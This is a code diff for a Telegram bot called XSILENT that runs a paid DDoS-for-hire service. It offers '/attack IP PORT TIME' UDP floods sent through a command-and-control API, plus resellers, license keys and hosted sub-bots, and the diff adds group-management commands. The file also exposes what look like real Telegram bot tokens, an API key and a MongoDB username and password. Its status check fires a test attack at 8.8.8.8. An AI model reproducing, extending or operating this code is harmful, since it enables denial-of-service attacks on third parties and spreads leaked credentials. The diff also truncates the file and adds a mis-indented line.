@@ -13,10 +13,10 @@ from collections import defaultdict
 from pymongo import MongoClient
 
 # ========== CONFIG ==========
-BOT_TOKEN = "8760406918:AAGwdutTqzAU6_U9IJNiOlNhgOrc2emJ5io"
+BOT_TOKEN = "8291785662:AAFBc1x-VXLUZrqqT-R75Yr5i6rLk7efKg4"
 ADMIN_ID = ["8487946379"]
 API_URL = "http://cnc.teamc2.xyz:5001/api/attack"
-API_KEY = "WTRMWL"
+API_KEY = "PFC10J"
 MAX_CONCURRENT = 2
 COOLDOWN_TIME = 30
 BUY_CONTACT = "XSILENT"
@@ -27,6 +27,7 @@ maintenance_message = "🔧 Bot is under maintenance! 🔧\n\nPlease try again l
 
 # ========== HOSTED BOTS ==========
 hosted_bots = {}
+hosted_bot_threads = {}
 
 # ========== MONGODB CONNECTION ==========
 MONGO_URI = "mongodb+srv://mohitrao83076_db_user:LugF1xwlenkWRE1F@monster.ydmmckl.mongodb.net/?retryWrites=true&w=majority&appName=MONSTER"
@@ -287,14 +288,25 @@ def check_user_expiry(user_id):
     return False
 
 # ========== HOST BOT FUNCTION ==========
+def stop_hosted_bot(bot_token):
+    """Stop a hosted bot completely"""
+    if bot_token in hosted_bot_threads:
+        # Thread will stop when bot is removed
+        pass
+    if bot_token in hosted_bots:
+        del hosted_bots[bot_token]
+    remove_hosted_bot(bot_token)
+    return True
+
 def start_hosted_bot(bot_token, owner_id, owner_name, concurrent):
+    """Start a hosted bot instance"""
     try:
         hosted_bot = telebot.TeleBot(bot_token)
         hosted_cooldown_data = {}
         
         @hosted_bot.message_handler(commands=['start'])
         def hosted_start(msg):
-            hosted_bot.reply_to(msg, f"✨ DDOS BOT ✨\n\n👑 Owner: {owner_name}\n✅ Status: Active\n⚡ Concurrent: {concurrent}\n⏱️ Max Time: 300s\n\n📝 COMMANDS:\n/attack IP PORT TIME\n/status\n/cooldown\n/addreseller USER_ID\n/removereseller USER_ID\n/genkey 1 or 5h\n/mykeys\n/redeem KEY\n/help\n\n🛒 Buy: {owner_name}")
+            hosted_bot.reply_to(msg, f"✨ DDOS BOT ✨\n\n👑 Owner: {owner_name}\n✅ Status: Active\n⚡ Concurrent: {concurrent}\n⏱️ Max Time: 300s\n\n📝 COMMANDS:\n/attack IP PORT TIME\n/status\n/cooldown\n/addreseller USER_ID\n/removereseller USER_ID\n/addgroup GROUP_ID TIME\n/removegroup GROUP_ID\n/genkey 1 or 5h\n/mykeys\n/redeem KEY\n/help\n\n🛒 Buy: {owner_name}")
         
         @hosted_bot.message_handler(commands=['cooldown'])
         def hosted_cooldown(msg):
@@ -308,6 +320,42 @@ def start_hosted_bot(bot_token, owner_id, owner_name, concurrent):
                     hosted_bot.reply_to(msg, "✅ No cooldown! You can attack now.")
             else:
                 hosted_bot.reply_to(msg, "✅ No cooldown! You can attack now.")
+        
+        @hosted_bot.message_handler(commands=['addgroup'])
+        def hosted_add_group(msg):
+            uid = str(msg.chat.id)
+            if uid != owner_id:
+                hosted_bot.reply_to(msg, "❌ Only bot owner can add groups!")
+                return
+            args = msg.text.split()
+            if len(args) != 3:
+                hosted_bot.reply_to(msg, "⚠️ Usage: /addgroup GROUP_ID TIME\n📌 Example: /addgroup -100123456789 60")
+                return
+            group_id = args[1]
+            try:
+                attack_time = int(args[2])
+                if attack_time < 10 or attack_time > 300:
+                    hosted_bot.reply_to(msg, "❌ Attack time must be 10-300 seconds!")
+                    return
+            except:
+                hosted_bot.reply_to(msg, "❌ Invalid time!")
+                return
+            save_group(group_id, attack_time, uid)
+            hosted_bot.reply_to(msg, f"✅ GROUP ADDED!\n👥 Group ID: {group_id}\n⏱️ Attack Time: {attack_time}s")
+        
+        @hosted_bot.message_handler(commands=['removegroup'])
+        def hosted_remove_group(msg):
+            uid = str(msg.chat.id)
+            if uid != owner_id:
+                hosted_bot.reply_to(msg, "❌ Only bot owner can remove groups!")
+                return
+            args = msg.text.split()
+            if len(args) != 2:
+                hosted_bot.reply_to(msg, "⚠️ Usage: /removegroup GROUP_ID")
+                return
+            group_id = args[1]
+            remove_group(group_id)
+            hosted_bot.reply_to(msg, f"✅ GROUP REMOVED!\n👥 Group ID: {group_id}")
         
         @hosted_bot.message_handler(commands=['attack'])
         def hosted_attack(msg):
@@ -567,7 +615,7 @@ def start_hosted_bot(bot_token, owner_id, owner_name, concurrent):
         
         @hosted_bot.message_handler(commands=['help'])
         def hosted_help(msg):
-            hosted_bot.reply_to(msg, f"✨ DDOS BOT HELP ✨\n\n👑 Owner: {owner_name}\n\n📝 COMMANDS:\n\n/attack IP PORT TIME - Launch UDP attack\n/status - Check attack slots\n/cooldown - Check your cooldown\n/addreseller USER_ID - Add reseller (Owner only)\n/removereseller USER_ID - Remove reseller (Owner only)\n/genkey 1 or 5h - Generate key (Owner/Reseller)\n/mykeys - View your keys (Owner only)\n/redeem KEY - Activate key\n/help - This menu\n/start - Bot info\n\n⚡ Concurrent Attacks: {concurrent}\n⏱️ Max Time: 300s\n⏳ Cooldown: {COOLDOWN_TIME}s\n🛒 Buy: {owner_name}")
+            hosted_bot.reply_to(msg, f"✨ DDOS BOT HELP ✨\n\n👑 Owner: {owner_name}\n\n📝 COMMANDS:\n\n/attack IP PORT TIME - Launch UDP attack\n/status - Check attack slots\n/cooldown - Check your cooldown\n/addreseller USER_ID - Add reseller (Owner only)\n/removereseller USER_ID - Remove reseller (Owner only)\n/addgroup GROUP_ID TIME - Add group (Owner only)\n/removegroup GROUP_ID - Remove group (Owner only)\n/genkey 1 or 5h - Generate key (Owner/Reseller)\n/mykeys - View your keys (Owner only)\n/redeem KEY - Activate key\n/help - This menu\n/start - Bot info\n\n⚡ Concurrent Attacks: {concurrent}\n⏱️ Max Time: 300s\n⏳ Cooldown: {COOLDOWN_TIME}s\n🛒 Buy: {owner_name}")
         
         def run_hosted_bot():
             try:
@@ -575,7 +623,9 @@ def start_hosted_bot(bot_token, owner_id, owner_name, concurrent):
             except:
                 pass
         
-        threading.Thread(target=run_hosted_bot, daemon=True).start()
+        thread = threading.Thread(target=run_hosted_bot, daemon=True)
+        thread.start()
+        hosted_bot_threads[bot_token] = thread
         return True
     except Exception as e:
         print(f"Failed to start hosted bot: {e}")
@@ -587,8 +637,13 @@ def start(msg):
     uid = str(msg.chat.id)
     chat_type = msg.chat.type
     
-    # Save user for broadcast
     save_broadcast_user(uid)
+    
+    # Auto add user to main list if not exists
+    if uid not in users and uid not in ADMIN_ID:
+        users.append(uid)
+        users_data["users"] = users
+        save_users(users_data)
     
     if check_maintenance():
         bot.reply_to(msg, maintenance_message)
@@ -877,7 +932,7 @@ def attack(msg):
                     "method": "udp"
                 }
                 
-                response = requests.get(API_URL, params=api_params, timeout=10)
+                 response = requests.get(API_URL, params=api_params, timeout=10)
                 
                 if response.status_code == 200:
                     time.sleep(duration)
@@ -994,9 +1049,9 @@ def unhost_bot(msg):
     bot_token = args[1]
     
     if bot_token in hosted_bots:
-        del hosted_bots[bot_token]
-        remove_hosted_bot(bot_token)
-        bot.reply_to(msg, f"✅ HOSTED BOT REMOVED!\n\n🔑 Token: {bot_token[:20]}...")
+        # Stop the hosted bot
+        stop_hosted_bot(bot_token)
+        bot.reply_to(msg, f"✅ HOSTED BOT STOPPED AND REMOVED!\n\n🔑 Token: {bot_token[:20]}...")
     else:
         bot.reply_to(msg, "❌ Hosted bot not found!")
 
@@ -1424,13 +1479,11 @@ def broadcast(msg):
         bot.reply_to(msg, "❌ Owner only!")
         return
     
-    # Get all users who started the bot
     all_broadcast_users = []
     for user in broadcast_users:
         all_broadcast_users.append(user)
     
     if msg.reply_to_message:
-        # Broadcast with media
         success_count = 0
         fail_count = 0
         caption = msg.text.split(maxsplit=1)[1] if len(msg.text.split(maxsplit=1)) > 1 else ""
@@ -1449,7 +1502,6 @@ def broadcast(msg):
         
         bot.reply_to(msg, f"✅ BROADCAST SENT!\n✅ Success: {success_count} users\n❌ Failed: {fail_count} users")
     else:
-        # Broadcast text only
         args = msg.text.split(maxsplit=1)
         if len(args) != 2:
             bot.reply_to(msg, "⚠️ Usage: /broadcast MESSAGE\n💡 Or reply to a photo/video with caption")
@@ -1575,114 +1627,4 @@ def help_cmd(msg):
 /removegroup GROUP_ID - Remove group
 
 /host BOT_TOKEN USER_ID CONCURRENT NAME - Host bot
-/unhost BOT_TOKEN - Remove hosted bot
-
-/maintenance on/off - Maintenance mode
-/broadcast - Broadcast (text/photo/video)
-/stopattack IP:PORT - Stop attack
-/allusers - List users
-/allgroups - List groups
-/allhosts - List hosted bots
-/api_status - API status
-
-⚡ Concurrent: {MAX_CONCURRENT}
-⏳ Cooldown: {COOLDOWN_TIME}s
-🛒 Buy: XSILENT""")
-    elif uid in resellers:
-        bot.reply_to(msg, f"""💎 XSILENT RESELLER HELP 💎
-
-📝 COMMANDS:
-
-/attack IP PORT TIME - Launch attack
-/status - Check slots
-/cooldown - Check your cooldown
-/genkey 1 or 5h - Generate key
-/mykeys - Your keys
-
-⚡ Concurrent: {MAX_CONCURRENT}
-⏳ Cooldown: {COOLDOWN_TIME}s
-🛒 Buy: XSILENT""")
-    elif uid in users:
-        bot.reply_to(msg, f"""🔥 XSILENT USER HELP 🔥
-
-📝 COMMANDS:
-
-/attack IP PORT TIME - Launch attack
-/status - Check slots
-/cooldown - Check your cooldown
-/redeem KEY - Activate key
-
-⚡ Concurrent: {MAX_CONCURRENT}
-⏳ Cooldown: {COOLDOWN_TIME}s
-🛒 Buy: XSILENT""")
-    else:
-        bot.reply_to(msg, f"❌ Unauthorized!\n\nUse /redeem KEY to activate\n\n🛒 Buy: XSILENT")
-
-@bot.message_handler(commands=['allusers'])
-def all_users(msg):
-    if check_maintenance():
-        bot.reply_to(msg, maintenance_message)
-        return
-    
-    if str(msg.chat.id) not in ADMIN_ID:
-        bot.reply_to(msg, "❌ Owner only!")
-        return
-    
-    user_list = []
-    for u in users:
-        if u in ADMIN_ID:
-            role = "👑 OWNER"
-        elif u in resellers:
-            role = "💎 RESELLER"
-        else:
-            role = "👤 USER"
-        user_list.append(f"{role}: {u}")
-    
-    bot.reply_to(msg, f"📋 ALL USERS:\n\n" + "\n".join(user_list) + f"\n\n📊 Total: {len(users)}")
-
-@bot.message_handler(commands=['api_status'])
-def api_status(msg):
-    if check_maintenance():
-        bot.reply_to(msg, maintenance_message)
-        return
-    
-    if str(msg.chat.id) not in ADMIN_ID:
-        bot.reply_to(msg, "❌ Owner only!")
-        return
-    
-    try:
-        test_response = requests.get(f"{API_URL}?api_key={API_KEY}&target=8.8.8.8&port=80&time=5&concurrent=1", timeout=5)
-        api_status_text = "Online" if test_response.status_code == 200 else "Offline"
-        bot.reply_to(msg, f"✅ API STATUS\n\n📡 Status: {api_status_text}\n🎯 Active Attacks: {len(active_attacks)}")
-    except:
-        bot.reply_to(msg, "❌ API OFFLINE")
-
-def cleanup_attacks():
-    while True:
-        time.sleep(5)
-        now = time.time()
-        
-        for attack_id, info in list(active_attacks.items()):
-            if now >= info["finish_time"]:
-                del active_attacks[attack_id]
-        
-        for key, info in list(keys_data.items()):
-            if info.get("used", False) and now > info["expires_at"]:
-                user_id = info.get("used_by")
-                if user_id and user_id in users and user_id not in ADMIN_ID:
-                    users.remove(user_id)
-                    users_data["users"] = users
-                    save_users(users_data)
-
-cleanup_thread = threading.Thread(target=cleanup_attacks, daemon=True)
-cleanup_thread.start()
-
-print("✨ XSILENT BOT STARTED ✨")
-print("👑 Owner: 8487946379")
-print(f"⚡ Max Concurrent: {MAX_CONCURRENT}")
-print(f"⏳ Cooldown: {COOLDOWN_TIME}s")
-print(f"📊 Hosted Bots: {len(hosted_bots)}")
-print(f"📢 Broadcast Users: {len(broadcast_users)}")
-
-bot.infinity_polling()
-    
+                
